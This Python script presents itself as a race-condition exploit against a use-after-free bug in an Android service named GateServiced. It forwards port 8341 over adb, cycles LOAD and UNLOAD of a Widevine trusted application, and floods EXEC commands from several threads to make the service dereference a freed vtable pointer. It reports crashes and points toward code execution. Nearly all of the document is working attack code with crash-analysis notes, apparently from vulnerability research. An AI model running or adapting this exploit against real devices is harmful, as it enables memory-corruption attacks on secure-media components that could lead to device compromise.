#!/usr/bin/env python3
"""
GateServiced UAF Race Exploit
==============================
TARGET: Use-After-Free on app_obj vtable pointer (confirmed in Crash #1)

Crash #1 from logcat shows:
  signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x0
  pc = 0x0  ← BLR X11 jumped to NULL vtable
  backtrace: #01 pc 0x2dc4 (run_exec_cmd_ta+852)
  
  This is the ISMCIGate_sharedMemoryExample vtable call at 0x2DC4.
  X11 was loaded from app_obj ([0x5000+0x410]) which was freed/zeroed.

STRATEGY:
  The previous race_unload test used send_packet which creates a new 
  TCP connection per EXEC. This wastes time on connect(). Instead:
  
  1. Use PERSISTENT connections (reuse same TCP socket)
  2. Send LOAD → wait for response → immediately UNLOAD on another socket
  3. Simultaneously EXEC on original socket
  4. The EXEC sees freed app_obj → controlled crash

Key timing insight from the disassembly:
  run_exec_cmd_ta reads app_obj at 0x2AF8 (LDR from [0x5000+0x410])
  run_unload_ta clears app_obj at some point after unload
  The race window is between LOAD's completion and UNLOAD's clearing of app_obj.

IMPORTANT: We need the EXEC to use a SMALL payload (< 20468) to avoid
the DMA overflow crash. We want to reach BLR X11, not crash at memcpy.

Usage:
  adb forward tcp:8341 tcp:8341
  python gate_uaf_race.py [--duration=30]
"""

import socket
import struct
import sys
import time
import threading
import os

TARGET_IP   = "127.0.0.1"
TARGET_PORT = 8341

CMD_LOAD_TA    = 0x00010003
CMD_UNLOAD_TA  = 0x00010004
CMD_EXEC       = 0x00010002
WIDEVINE_PATH  = b"/vendor/firmware_mnt/image/widevine.mbn\x00"


class PersistentConnection:
    """Persistent TCP connection to GateServiced for fast command sending."""
    
    def __init__(self, timeout=3):
        self.sock = None
        self.timeout = timeout
    
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((TARGET_IP, TARGET_PORT))
            return True
        except:
            return False
    
    def send_cmd(self, cmd_id, payload=b"", timeout=None):
        """Send command and get response on persistent connection."""
        if timeout:
            self.sock.settimeout(timeout)
        packet = struct.pack("<I", cmd_id) + payload
        try:
            t0 = time.monotonic()
            self.sock.sendall(packet)
            resp = self.sock.recv(8192)
            ms = (time.monotonic() - t0) * 1000
            if resp == b"":
                return "CLOSED", ms, b""
            return "RESPONSE", ms, resp
        except socket.timeout:
            ms = (time.monotonic() - t0) * 1000
            return "TIMEOUT", ms, b""
        except ConnectionResetError:
            ms = (time.monotonic() - t0) * 1000
            return "RESET", ms, b""
        except BrokenPipeError:
            ms = (time.monotonic() - t0) * 1000
            return "BROKEN", ms, b""
        except Exception as e:
            return f"ERROR:{e}", 0, b""
    
    def close(self):
        try:
            self.sock.close()
        except:
            pass


def quick_send(cmd_id, payload=b"", timeout=2):
    """One-shot send via fresh connection."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((TARGET_IP, TARGET_PORT))
        packet = struct.pack("<I", cmd_id) + payload
        t0 = time.monotonic()
        sock.sendall(packet)
        resp = sock.recv(8192)
        ms = (time.monotonic() - t0) * 1000
        sock.close()
        if resp == b"":
            return "CLOSED", ms
        return "RESPONSE", ms
    except socket.timeout:
        ms = (time.monotonic() - t0) * 1000
        try: sock.close()
        except: pass
        return "TIMEOUT", ms
    except ConnectionResetError:
        try: sock.close()
        except: pass
        return "RESET", 0
    except:
        return "ERROR", 0


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET_IP, TARGET_PORT))
        s.close()
        return True
    except:
        return False


def mode_race_v2(duration=30):
    """
    Improved race condition targeting the UAF on app_obj vtable.
    
    Strategy: Use TWO persistent connections.
      - Conn A: LOAD → confirm loaded → rapid EXEC calls
      - Conn B: timed UNLOAD during EXEC window
    
    The goal: EXEC reads app_obj AFTER UNLOAD frees it → UAF → crash.
    
    Crash detection: "CLOSED" or "RESET" on the EXEC connection.
    """
    print("=" * 70)
    print("MODE: UAF RACE v2 (persistent connections, tight timing)")
    print("=" * 70)
    print()
    print(f"Duration: {duration}s")
    print("Strategy: Conn A = EXEC spam, Conn B = UNLOAD timing")
    print()

    results = {
        "exec_attempts": 0,
        "exec_timeouts": 0,
        "exec_responses": 0,
        "exec_crashes": 0,
        "load_count": 0,
        "unload_count": 0,
        "errors": 0,
    }

    stop = threading.Event()

    def exec_thread():
        """Rapid EXEC calls on dedicated connection."""
        while not stop.is_set():
            conn = PersistentConnection(timeout=2)
            if not conn.connect():
                results["errors"] += 1
                time.sleep(0.5)
                continue
            
            # Small payload to avoid DMA overflow (stay under 20467)
            payload = struct.pack("<I", 0x100)  # 4 bytes
            
            for _ in range(50):  # 50 EXEC per connection
                if stop.is_set():
                    break
                status, ms, resp = conn.send_cmd(CMD_EXEC, payload, timeout=1)
                results["exec_attempts"] += 1
                
                if status == "RESPONSE":
                    results["exec_responses"] += 1
                    print(f"\n  [★★★] EXEC RESPONSE! {resp[:40].hex()} ({ms:.1f}ms)")
                elif status == "TIMEOUT":
                    results["exec_timeouts"] += 1
                elif status in ("CLOSED", "RESET", "BROKEN"):
                    results["exec_crashes"] += 1
                    print(f"\n  [!!!] EXEC {status} ({ms:.1f}ms) ← POSSIBLE UAF CRASH!")
                    break  # Connection dead, need new one
                else:
                    results["errors"] += 1
                    break
            
            conn.close()

    def load_unload_thread():
        """Rapid LOAD/UNLOAD cycling to create race window."""
        while not stop.is_set():
            # LOAD
            status, ms = quick_send(CMD_LOAD_TA, WIDEVINE_PATH, timeout=5)
            if status == "RESPONSE":
                results["load_count"] += 1
            elif status in ("CLOSED", "RESET"):
                results["exec_crashes"] += 1
                time.sleep(1)
                continue
            else:
                time.sleep(0.3)
                continue
            
            # Wait a tiny bit (let EXEC start processing)
            time.sleep(0.001)  # 1ms
            
            # UNLOAD (this frees app_obj → creates UAF window)
            status, ms = quick_send(CMD_UNLOAD_TA, b"", timeout=2)
            results["unload_count"] += 1
            
            # Varying delays to hit different race windows
            delay = (results["unload_count"] % 10) * 0.001  # 0-9ms
            time.sleep(delay)

    # Phase 1: Ensure TA is loaded
    print("[*] Loading TA...")
    status, ms = quick_send(CMD_LOAD_TA, WIDEVINE_PATH, timeout=10)
    if status != "RESPONSE":
        print(f"[-] Cannot load TA: {status}")
        return
    print(f"[+] TA loaded ({ms:.1f}ms)")

    # Phase 2: Start race threads
    print(f"\n[*] Starting race threads ({duration}s)...")
    
    t_exec = threading.Thread(target=exec_thread, daemon=True)
    t_load = threading.Thread(target=load_unload_thread, daemon=True)
    
    t_exec.start()
    t_load.start()

    # Monitor progress
    t_start = time.monotonic()
    while time.monotonic() - t_start < duration:
        elapsed = time.monotonic() - t_start
        print(f"\r  [{elapsed:.0f}/{duration}s] exec={results['exec_attempts']} "
              f"timeouts={results['exec_timeouts']} crashes={results['exec_crashes']} "
              f"loads={results['load_count']} unloads={results['unload_count']}", end="", flush=True)
        time.sleep(1)

    stop.set()
    t_exec.join(timeout=5)
    t_load.join(timeout=5)

    print()
    print()
    print("=" * 60)
    print("RACE v2 RESULTS:")
    print(f"  EXEC attempts:   {results['exec_attempts']}")
    print(f"  EXEC timeouts:   {results['exec_timeouts']}")
    print(f"  EXEC responses:  {results['exec_responses']}")
    print(f"  EXEC crashes:    {results['exec_crashes']}  {'← UAF TRIGGERED!' if results['exec_crashes'] > 0 else ''}")
    print(f"  LOAD count:      {results['load_count']}")
    print(f"  UNLOAD count:    {results['unload_count']}")
    print(f"  Errors:          {results['errors']}")
    print("=" * 60)

    if results["exec_crashes"] > 0:
        print()
        print("[★] UAF crash detected! Check logcat for details:")
        print("    adb logcat -d -s 'DEBUG:*' | findstr GateServiced")
        print()
        print("If PC != 0x0 and registers contain controlled data,")
        print("the UAF is exploitable for code execution!")


def mode_race_v3(duration=60):
    """
    Race v3: Maximum aggression with multiple EXEC threads.
    
    Strategy:
      - 1 thread: rapid LOAD/UNLOAD cycling (every ~5ms)
      - 3 threads: concurrent EXEC calls from different connections
      
    This increases the probability of hitting the race window where
    app_obj is freed but g_loaded_flag is still set.
    """
    print("=" * 70)
    print("MODE: UAF RACE v3 (multi-threaded, maximum aggression)")
    print("=" * 70)
    print()

    results = {
        "exec_total": 0,
        "exec_timeouts": 0,
        "crashes": 0,
        "loads": 0,
        "resets": 0,
    }
    lock = threading.Lock()
    stop = threading.Event()

    def exec_worker(worker_id):
        while not stop.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)  # Very short timeout
                sock.connect((TARGET_IP, TARGET_PORT))
                
                # Small exec payload (avoid DMA overflow)
                pkt = struct.pack("<I", CMD_EXEC) + struct.pack("<I", 0x100)
                sock.sendall(pkt)
                
                try:
                    resp = sock.recv(8192)
                    with lock:
                        results["exec_total"] += 1
                        if resp == b"":
                            results["crashes"] += 1
                        elif len(resp) > 0:
                            results["exec_total"] += 0  # response
                            print(f"\n  [★] W{worker_id}: EXEC response! {resp[:20].hex()}")
                except socket.timeout:
                    with lock:
                        results["exec_total"] += 1
                        results["exec_timeouts"] += 1
                
                sock.close()
            except ConnectionResetError:
                with lock:
                    results["exec_total"] += 1
                    results["resets"] += 1
            except ConnectionRefusedError:
                time.sleep(0.5)  # Service restarting
            except:
                pass

    def load_unload_worker():
        while not stop.is_set():
            try:
                # LOAD
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((TARGET_IP, TARGET_PORT))
                s.sendall(struct.pack("<I", CMD_LOAD_TA) + WIDEVINE_PATH)
                try:
                    resp = s.recv(8192)
                    if resp and b"succeed" in resp:
                        with lock:
                            results["loads"] += 1
                except:
                    pass
                s.close()
                
                # Tiny delay (EXEC threads are racing)
                time.sleep(0.0005)  # 0.5ms
                
                # UNLOAD
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(2)
                s2.connect((TARGET_IP, TARGET_PORT))
                s2.sendall(struct.pack("<I", CMD_UNLOAD_TA))
                try: s2.recv(8192)
                except: pass
                s2.close()
                
                time.sleep(0.002)  # 2ms between cycles
                
            except ConnectionRefusedError:
                time.sleep(1)
            except:
                time.sleep(0.1)

    # Start threads
    print(f"[*] Running v3 race for {duration}s (1 load/unload + 3 exec threads)...")
    
    threads = []
    for i in range(3):
        t = threading.Thread(target=exec_worker, args=(i,), daemon=True)
        threads.append(t)
        t.start()
    
    t_lu = threading.Thread(target=load_unload_worker, daemon=True)
    t_lu.start()
    threads.append(t_lu)

    t0 = time.monotonic()
    while time.monotonic() - t0 < duration:
        elapsed = time.monotonic() - t0
        with lock:
            print(f"\r  [{elapsed:.0f}/{duration}s] execs={results['exec_total']} "
                  f"timeouts={results['exec_timeouts']} crashes={results['crashes']} "
                  f"resets={results['resets']} loads={results['loads']}", end="", flush=True)
        time.sleep(1)

    stop.set()
    for t in threads:
        t.join(timeout=3)

    print()
    print()
    print("=" * 60)
    print("RACE v3 RESULTS:")
    with lock:
        print(f"  Total EXEC:   {results['exec_total']}")
        print(f"  Timeouts:     {results['exec_timeouts']}")
        print(f"  Crashes:      {results['crashes']}  {'← CHECK LOGCAT!' if results['crashes'] > 0 else ''}")
        print(f"  Resets:       {results['resets']}  {'← POSSIBLE CRASH!' if results['resets'] > 0 else ''}")
        print(f"  Loads:        {results['loads']}")
    print("=" * 60)
    
    if results['crashes'] > 0 or results['resets'] > 0:
        print("\n[★] Potential crashes detected!")
        print("    adb logcat -d -s 'DEBUG:*' | findstr /i \"GateServiced\\|fault addr\"")


def main():
    args = sys.argv[1:]
    duration = 30
    
    for a in list(args):
        if a.startswith("--duration="):
            duration = int(a.split("=")[1])
            args.remove(a)

    mode = args[0] if args else "v2"
    
    print(f"\n[Config] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[Config] Duration: {duration}s\n")

    if mode == "v2":
        mode_race_v2(duration)
    elif mode == "v3":
        mode_race_v3(duration)
    else:
        print("Modes: v2 (2 threads), v3 (4 threads, max aggression)")
        print("Usage: python gate_uaf_race.py [v2|v3] [--duration=30]")


if __name__ == "__main__":
    main()
